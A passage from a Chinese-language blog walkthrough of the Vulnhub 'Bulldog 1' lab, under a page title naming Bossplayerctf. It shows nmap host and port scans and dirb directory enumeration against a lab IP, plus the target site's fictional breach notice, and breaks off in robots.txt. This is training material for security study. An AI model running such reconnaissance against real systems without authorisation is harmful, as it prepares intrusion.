@@ -1,0 +1,898 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="这个靶场的提示还是很有指向性的，打完这个就大一打过的Vulnhub已经复习完毕了"><title>Bossplayerctf 1 Vulunhub靶场复现-重走来时路7</title><link rel=canonical href=https://ke1thli.github.io/p/bossplayerctf-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF7/><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=preload as=style href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap"><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap"><link rel=stylesheet href=/scss/style.min.389e156f5e9bb13df5a924cfa99dfb9c39f3e01e68d9e146cd65bdae963be145.css><meta property='og:title' content="Bossplayerctf 1 Vulunhub靶场复现-重走来时路7"><meta property='og:description' content="这个靶场的提示还是很有指向性的，打完这个就大一打过的Vulnhub已经复习完毕了"><meta property='og:url' content='https://ke1thli.github.io/p/bossplayerctf-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF7/'><meta property='og:site_name' content='Ke1thLi 的技术笔记'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Vulnhub'><meta property='article:published_time' content='2026-08-12T00:00:00+00:00'><meta property='article:modified_time' content='2026-08-12T00:00:00+00:00'><meta name=twitter:title content="Bossplayerctf 1 Vulunhub靶场复现-重走来时路7"><meta name=twitter:description content="这个靶场的提示还是很有指向性的，打完这个就大一打过的Vulnhub已经复习完毕了"><link rel="shortcut icon" href=/img/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar.png width=640 height=640 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🎓</span></figure><div class=site-meta><h1 class=site-name><a href=/>Ke1thLi 的技术笔记</a></h1><h2 class=site-description>The harder you work, the luckier you get</h2></div></header><ol class=menu-social><li><a href=https://github.com/Ke1thLi title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span></span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title"></h2><div class=widget--toc><nav class=toc-nav id=TableOfContents><ol><li><a href=#靶场介绍与搭建>靶场介绍与搭建</a></li><li><a href=#信息收集>信息收集</a><ol><li><a href=#主机发现>主机发现</a></li><li><a href=#端口扫描与漏洞探测>端口扫描与漏洞探测</a></li><li><a href=#目录枚举>目录枚举</a></li></ol></li><li><a href=#漏洞发现及其利用>漏洞发现及其利用</a><ol><li><a href=#访问网页得到以下文字>访问网页得到以下文字</a></li><li><a href=#访问notice>访问notice</a></li><li><a href=#对robotstxt>对robots.txt</a></li><li><a href=#访问dev-发现前端源代码隐藏敏感信息>访问/dev/ 发现前端源代码隐藏敏感信息</a></li><li><a href=#访问http101010137devshell>访问http://10.10.10.137/dev/shell/</a></li><li><a href=#访问-admin>访问 /admin</a></li><li><a href=#总结一下>总结一下</a></li></ol></li><li><a href=#md5解密登陆后台>md5解密，登陆后台</a></li><li><a href=#回去devshell验证是否存在命令注入漏洞>回去/dev/shell，验证是否存在命令注入漏洞</a></li><li><a href=#命令注入shell成功得到django权限>命令注入shell成功，得到django权限</a><ol><li><a href=#django用户权限下的信息收集>django用户权限下的信息收集</a></li></ol></li><li><a href=#权限提升>权限提升</a><ol><li><a href=#查看有什么用户信息>查看有什么用户信息</a></li></ol></li><li><a href=#尝试suid提权>尝试suid提权</a><ol><li><a href=#对bulldogadmin用户文件进行枚举>对bulldogadmin用户文件进行枚举</a></li><li><a href=#再次sudo-提权>再次sudo 提权</a></li></ol></li><li><a href=#得到flag>得到flag</a></li><li><a href=#寻找新的提权方法>寻找新的提权方法</a></li><li><a href=#篡改脚本检验是否存在漏洞>篡改脚本，检验是否存在漏洞</a></li><li><a href=#验证漏洞存在提权成功>验证漏洞存在，提权成功</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/bossplayerctf-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF7/>Bossplayerctf 1 Vulunhub靶场复现-重走来时路7</a></h2><h3 class=article-subtitle>这个靶场的提示还是很有指向性的，打完这个就大一打过的Vulnhub已经复习完毕了</h3></div><footer class=article-meta><div class=inline-meta><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2026-08-12T00:00:00Z>Wednesday, August 12, 2026</time>
+<svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading></time></div></footer></div></header><aside class=article-toc><details><summary><div class=article-toc-title><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-chevron-right"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6-6 6"/></svg>
+<span></span></div></summary><nav class=toc-nav><ol><li><a href=#靶场介绍与搭建>靶场介绍与搭建</a></li><li><a href=#信息收集>信息收集</a><ol><li><a href=#主机发现>主机发现</a></li><li><a href=#端口扫描与漏洞探测>端口扫描与漏洞探测</a></li><li><a href=#目录枚举>目录枚举</a></li></ol></li><li><a href=#漏洞发现及其利用>漏洞发现及其利用</a><ol><li><a href=#访问网页得到以下文字>访问网页得到以下文字</a></li><li><a href=#访问notice>访问notice</a></li><li><a href=#对robotstxt>对robots.txt</a></li><li><a href=#访问dev-发现前端源代码隐藏敏感信息>访问/dev/ 发现前端源代码隐藏敏感信息</a></li><li><a href=#访问http101010137devshell>访问http://10.10.10.137/dev/shell/</a></li><li><a href=#访问-admin>访问 /admin</a></li><li><a href=#总结一下>总结一下</a></li></ol></li><li><a href=#md5解密登陆后台>md5解密，登陆后台</a></li><li><a href=#回去devshell验证是否存在命令注入漏洞>回去/dev/shell，验证是否存在命令注入漏洞</a></li><li><a href=#命令注入shell成功得到django权限>命令注入shell成功，得到django权限</a><ol><li><a href=#django用户权限下的信息收集>django用户权限下的信息收集</a></li></ol></li><li><a href=#权限提升>权限提升</a><ol><li><a href=#查看有什么用户信息>查看有什么用户信息</a></li></ol></li><li><a href=#尝试suid提权>尝试suid提权</a><ol><li><a href=#对bulldogadmin用户文件进行枚举>对bulldogadmin用户文件进行枚举</a></li><li><a href=#再次sudo-提权>再次sudo 提权</a></li></ol></li><li><a href=#得到flag>得到flag</a></li><li><a href=#寻找新的提权方法>寻找新的提权方法</a></li><li><a href=#篡改脚本检验是否存在漏洞>篡改脚本，检验是否存在漏洞</a></li><li><a href=#验证漏洞存在提权成功>验证漏洞存在，提权成功</a></li></ol></nav></details></aside><section class=article-content><h1 id=bulldog-1-复现-vulunhub靶场复现-重走来时路>Bulldog 1 复现 Vulunhub靶场复现-重走来时路</h1><h2 id=靶场介绍与搭建>靶场介绍与搭建</h2><p>下载地址 <a class=link href=https://vulnhub.com/entry/bulldog-1,211/ target=_blank rel=noopener>https://vulnhub.com/entry/bulldog-1,211/</a></p><p>介绍</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Bulldog Industries recently had its website defaced and owned by the malicious German Shepherd Hack Team. Could this mean there are more vulnerabilities to exploit? Why don&#39;t you find out? :)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>This is a standard Boot-to-Root. Your only goal is to get into the root directory and see the congratulatory message, how you do it is up to you!
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Difficulty: Beginner/Intermediate, if you get stuck, try to figure out all the different ways you can interact with the system. That&#39;s my only hint ;)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Made by Nick Frichette (frichetten.com) Twitter: @frichette_n
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>I&#39;d highly recommend running this on Virtualbox, I had some issues getting it to work in VMware. Additionally DHCP is enabled so you shouldn&#39;t have any troubles getting it onto your network. It defaults to bridged mode, but feel free to change that if you like.
+</span></span></code></pre></td></tr></table></div></div><p>搭建的话和BossplayerCTF是一样的，搭建靶场部署在 Vitrualbox，网卡设置为 hostonly，回到 VMware 的 kali 上网卡设置为 Bridge 选择 Virtualbox 的网卡。</p><h2 id=信息收集>信息收集</h2><h3 id=主机发现>主机发现</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>sudo nmap -sn 10.10.10.0/24
+</span></span></code></pre></td></tr></table></div></div><p>得到靶机ip为10.10.10.137</p><h3 id=端口扫描与漏洞探测>端口扫描与漏洞探测</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Bulldog1<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo nmap --min-rate <span class=m>1000</span> -p- 10.10.10.137  
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-08-10 03:42 -0400
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.137
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00087s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>65532</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT     STATE SERVICE
+</span></span><span class=line><span class=cl>23/tcp   open  telnet
+</span></span><span class=line><span class=cl>80/tcp   open  http
+</span></span><span class=line><span class=cl>8080/tcp open  http-proxy
+</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:76:0D:B9 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 4.04 seconds
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Bulldog1<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo nmap -p23,80,8080 -sS -A 10.10.10.137
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-08-10 03:47 -0400
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.137
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00069s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>PORT     STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>23/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> 20:8b:fc:9e:d9:2e:28:22:6b:2e:0e:e3:72:c5:bb:52 <span class=o>(</span>RSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> cd:bd:45:d8:5c:e4:8c:b6:91:e5:39:a9:66:cb:d7:98 <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 2f:ba:d5:e5:9f:a2:43:e5:3b:24:2c:10:c2:0a:da:66 <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl>80/tcp   open  http    WSGIServer 0.1 <span class=o>(</span>Python 2.7.12<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: WSGIServer/0.1 Python/2.7.12
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Bulldog Industries
+</span></span><span class=line><span class=cl>8080/tcp open  http    WSGIServer 0.1 <span class=o>(</span>Python 2.7.12<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: WSGIServer/0.1 Python/2.7.12
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Bulldog Industries
+</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:76:0D:B9 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>Warning: OSScan results may be unreliable because we could not find at least <span class=m>1</span> open and <span class=m>1</span> closed port
+</span></span><span class=line><span class=cl>Device type: general purpose
+</span></span><span class=line><span class=cl>Running: Linux 3.X<span class=p>|</span>4.X
+</span></span><span class=line><span class=cl>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+</span></span><span class=line><span class=cl>OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
+</span></span><span class=line><span class=cl>Network Distance: <span class=m>1</span> hop
+</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>TRACEROUTE
+</span></span><span class=line><span class=cl>HOP RTT     ADDRESS
+</span></span><span class=line><span class=cl><span class=m>1</span>   0.69 ms 10.10.10.137
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 16.47 seconds
+</span></span></code></pre></td></tr></table></div></div><div class=table-wrapper><table><thead><tr><th>端口</th><th>服务</th><th>标题/版本</th><th>备注</th></tr></thead><tbody><tr><td>23</td><td>SSH (OpenSSH 7.2p2)</td><td></td><td>登录入口</td></tr><tr><td>80</td><td>HTTP (WSGIServer / Python 2.7.12)</td><td>Bulldog Industries</td><td>Web 入口</td></tr><tr><td>8080</td><td>HTTP (WSGIServer / Python 2.7.12)</td><td>Bulldog Industries</td><td>同样是 Web 入口，标题相同</td></tr></tbody></table></div><h3 id=目录枚举>目录枚举</h3><p>分别对80 和8080 端口进行目录枚举，发现结果一模一样，说明两个端口跑的是<strong>同一个 Django 应用</strong>，只是多一个入口而已，这里只显示80端口结果</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>sudo dirb http://10.10.10.137:80                                            
+</span></span><span class=line><span class=cl>-----------------                             
+</span></span><span class=line><span class=cl>DIRB v2.22                                         
+</span></span><span class=line><span class=cl>By The Dark Raver                                      
+</span></span><span class=line><span class=cl>----------------- 
+</span></span><span class=line><span class=cl>START_TIME: Mon Aug <span class=m>10</span> 03:53:46 <span class=m>2026</span>
+</span></span><span class=line><span class=cl>URL_BASE: http://10.10.10.137:80/
+</span></span><span class=line><span class=cl>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+</span></span><span class=line><span class=cl>-----------------
+</span></span><span class=line><span class=cl>GENERATED WORDS: <span class=m>4612</span>                               
+</span></span><span class=line><span class=cl>---- Scanning URL: http://10.10.10.137:80/ ----
+</span></span><span class=line><span class=cl><span class=o>==</span>&gt; DIRECTORY: http://10.10.10.137:80/admin/        
+</span></span><span class=line><span class=cl><span class=o>==</span>&gt; DIRECTORY: http://10.10.10.137:80/dev/          
+</span></span><span class=line><span class=cl>+ http://10.10.10.137:80/robots.txt <span class=o>(</span>CODE:200<span class=p>|</span>SIZE:1071<span class=o>)</span>                    
+</span></span><span class=line><span class=cl>---- Entering directory: http://10.10.10.137:80/admin/ ----
+</span></span><span class=line><span class=cl><span class=o>==</span>&gt; DIRECTORY: http://10.10.10.137:80/admin/auth/   
+</span></span><span class=line><span class=cl><span class=o>==</span>&gt; DIRECTORY: http://10.10.10.137:80/admin/login/  
+</span></span><span class=line><span class=cl><span class=o>==</span>&gt; DIRECTORY: http://10.10.10.137:80/admin/logout/ 
+</span></span><span class=line><span class=cl>---- Entering directory: http://10.10.10.137:80/dev/ ----
+</span></span><span class=line><span class=cl><span class=o>==</span>&gt; DIRECTORY: http://10.10.10.137:80/dev/shell/    
+</span></span><span class=line><span class=cl>---- Entering directory: http://10.10.10.137:80/admin/auth/ ----
+</span></span><span class=line><span class=cl><span class=o>==</span>&gt; DIRECTORY: http://10.10.10.137:80/admin/auth/group/         
+</span></span><span class=line><span class=cl><span class=o>==</span>&gt; DIRECTORY: http://10.10.10.137:80/admin/auth/user/ 
+</span></span><span class=line><span class=cl>---- Entering directory: http://10.10.10.137:80/admin/login/ ----
+</span></span><span class=line><span class=cl>---- Entering directory: http://10.10.10.137:80/admin/logout/ ----
+</span></span><span class=line><span class=cl>---- Entering directory: http://10.10.10.137:80/dev/shell/ ----
+</span></span><span class=line><span class=cl>---- Entering directory: http://10.10.10.137:80/admin/auth/group/ ----
+</span></span><span class=line><span class=cl><span class=o>(</span>!<span class=o>)</span> WARNING: NOT_FOUND<span class=o>[]</span> not stable, unable to determine correct URLs <span class=o>{</span>30X<span class=o>}</span>.
+</span></span><span class=line><span class=cl>    <span class=o>(</span>Try using FineTunning: <span class=s1>&#39;-f&#39;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>---- Entering directory: http://10.10.10.137:80/admin/auth/user/ ----
+</span></span><span class=line><span class=cl><span class=o>(</span>!<span class=o>)</span> WARNING: NOT_FOUND<span class=o>[]</span> not stable, unable to determine correct URLs <span class=o>{</span>30X<span class=o>}</span>.
+</span></span><span class=line><span class=cl>    <span class=o>(</span>Try using FineTunning: <span class=s1>&#39;-f&#39;</span><span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>注意robots.txt /dev/ /admin/</p><h2 id=漏洞发现及其利用>漏洞发现及其利用</h2><h3 id=访问网页得到以下文字>访问网页得到以下文字</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Thank you for visiting Bulldog Industries&#39; website, the world&#39;s number one purveyor of high quality English Bulldog photography! Unfortunately we are suspending business operations until further notice. On the first of this month, we were made aware of a breach of our technology systems. We are currently assessing the possibility that hackers may have gotten access to customer payment information. Do not be alarmed as we will be providing simple credit monitoring for all affected customers.  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>For more information on this, please see our public disclosure notice found below.
+</span></span></code></pre></td></tr></table></div></div><p>下方有个可交互的public notice 链接指向 /notice</p><h3 id=访问notice>访问notice</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>To our valued customers,  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>On the first of this month our technical analysts discovered a breach of our payment card systems. I don’t know how these hackers did it. Our technical folk are telling me something about a clam shell and a smelly cow? I&#39;m not sure about all of that.  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>To prove Bulldog Industries’ commitment to our customers I fired all of our existing technical staff. All of them! We are going to restart from the ground up! No more excuses! Our tech guys will have to make due with what they’ve got. We even increased their budget 1%!  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>You gotta see the neck beards on the new guys! Real tech hipsters. Zuckerberg types. They know their stuff, security wont be a problem from now on!  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>I&#39;d like to remind our valued customers that we will be providing basic credit monitoring services as a result of this breach (if you’ve made a purchase of $100 or more).  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>Your true friend,  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>Winston Churchy (CEO)
+</span></span></code></pre></td></tr></table></div></div><h3 id=对robotstxt>对robots.txt</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>  ________                                       _________.__                  .__                     .___
+</span></span><span class=line><span class=cl> /  _____/  ___________  _____ _____    ____    /   _____/<span class=p>|</span>  <span class=p>|</span>__   ____ ______ <span class=p>|</span>  <span class=p>|</span>__   ___________  __<span class=p>|</span> _/
+</span></span><span class=line><span class=cl>/   <span class=se>\ </span> ____/ __ <span class=se>\_</span>  __ <span class=se>\/</span>     <span class=se>\\</span>__  <span class=se>\ </span> /    <span class=se>\ </span>  <span class=se>\_</span>____  <span class=se>\ </span><span class=p>|</span>  <span class=p>|</span>  <span class=se>\_</span>/ __ <span class=se>\\</span>____ <span class=se>\|</span>  <span class=p>|</span>  <span class=se>\_</span>/ __ <span class=se>\_</span>  __ <span class=se>\/</span> __ <span class=p>|</span> 
